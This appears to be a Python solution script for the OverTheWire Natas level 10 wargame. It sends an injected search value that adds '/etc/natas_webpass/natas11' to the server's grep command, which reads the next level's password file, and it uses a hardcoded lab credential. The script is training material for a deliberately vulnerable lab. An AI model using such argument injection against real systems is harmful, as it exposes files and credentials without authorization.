import requests
from requests.auth import HTTPBasicAuth

auth = HTTPBasicAuth("natas10", "D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE")
payload = 'a /etc/natas_webpass/natas11 '
response = requests.post("http://natas10.natas.labs.overthewire.org/", data={"needle":payload}, auth=auth).text
res_list = response.split('\n')
print(res_list)
res = [res for res in res_list if not res.startswith("dictionary.txt")]
print(res)